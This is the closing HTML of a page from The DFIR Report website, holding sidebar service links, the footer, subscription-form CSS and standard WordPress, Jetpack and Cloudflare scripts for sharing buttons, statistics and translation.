<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/dfir-labs/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png" alt="" class="wp-image-31051 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2024/04/labs-s.png 200w, https://thedfirreport.com/wp-content/uploads/2024/04/labs-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a></h3>
</div></div>
</section><section id="block-12" class="widget widget_block">
<div class="wp-block-media-text" style="grid-template-columns:15% auto"><figure class="wp-block-media-text__media"><a href="https://thedfirreport.com/services/mentoring-coaching-program/"><img loading="lazy" decoding="async" width="200" height="200" src="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png" alt="" class="wp-image-21333 size-full" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/help4-s.png 200w, https://thedfirreport.com/wp-content/uploads/2023/09/help4-s-150x150.png 150w" sizes="auto, (max-width: 200px) 100vw, 200px" /></a></figure><div class="wp-block-media-text__content">
<h3 class="wp-block-heading"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring and Coaching</a></h3>
</div></div>
</section></aside><!-- #secondary -->
</div><!-- .wrap .wrap-width-->
		</div><!-- .site-content-cell -->
	</div><!-- #content -->
	
	<footer id="colophon" class="site-footer" role="contentinfo">

			
		<div class="copyright-area">
			<div class="wrap">
								<div class="site-info">
					    <a href="https://wordpress.org/">
Proudly powered by WordPress</a>
<span class="sep"> | </span>
Copyright 2023 | The DFIR Report | All Rights Reserved				</div><!-- .site-info -->
												<div class="footer-right-info">
															</div>
									</div><!-- .wrap -->
		</div><!-- .copyright-area -->
	</footer><!-- #colophon -->
			<button href="#" class="back-to-top" type="button"><i class="fa-solid fa-arrow-up-long"></i>Go Top</button>
	</div><!-- #page -->


	<script type="a03df4888b9b541f3483938f-text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/thedfirreport.com\/2021\/10\/04\/bazarloader-and-the-conti-leaks\/":4173};
	</script>
				<style id='jetpack-block-subscriptions-inline-css' type='text/css'>
.is-style-compact .is-not-subscriber .wp-block-button__link,.is-style-compact .is-not-subscriber .wp-block-jetpack-subscriptions__button{border-end-start-radius:0!important;border-start-start-radius:0!important;margin-inline-start:0!important}.is-style-compact .is-not-subscriber .components-text-control__input,.is-style-compact .is-not-subscriber p#subscribe-email input[type=email]{border-end-end-radius:0!important;border-start-end-radius:0!important}.is-style-compact:not(.wp-block-jetpack-subscriptions__use-newline) .components-text-control__input{border-inline-end-width:0!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form-container{display:flex;flex-direction:column}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) .is-not-subscriber .wp-block-jetpack-subscriptions__form-elements{align-items:flex-start;display:flex}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline:not(.wp-block-jetpack-subscriptions__use-newline) p#subscribe-submit{display:flex;justify-content:center}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]{box-sizing:border-box;cursor:pointer;line-height:1.3;min-width:auto!important;white-space:nowrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button[contenteditable=true],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button[contenteditable=true]{white-space:pre-wrap!important}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form input[type=email]:disabled,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]::placeholder,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form input[type=email]:disabled{color:currentColor;opacity:.5}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form button{border-color:#0000;border-style:solid}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email{background:#0000;flex-grow:1}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.7.1" id="freenews-navigation-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.7.1" id="freenews-skip-link-focus-fix-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.7.1" id="ResizeSensor-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.7.1" id="theia-sticky-sidebar-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.7.1" id="slick-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.7.1" id="freenews-slick-settings-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.7.1" id="jquery-sticky-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.7.1" id="freenews-sticky-settings-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.7.1" id="marquee-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.7.1" id="freenews-marquee-settings-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://stats.wp.com/e-202451.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"4173\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:14.1\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "4173" ]);
/* ]]> */
</script>
<script type="a03df4888b9b541f3483938f-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://c0.wp.com/p/jetpack/14.1/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=14.1" id="google-translate-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=14.1" id="jetpack-block-subscriptions-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="a03df4888b9b541f3483938f-text/javascript" src="https://c0.wp.com/p/jetpack/14.1/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="a03df4888b9b541f3483938f-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>

<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="a03df4888b9b541f3483938f-|49" defer></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8f3c32865c65e018","version":"2024.10.5","r":1,"serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"e6611380fbbe475a97dc9cf0a0e9fd2b","b":1}' crossorigin="anonymous"></script>
</body>
</html>
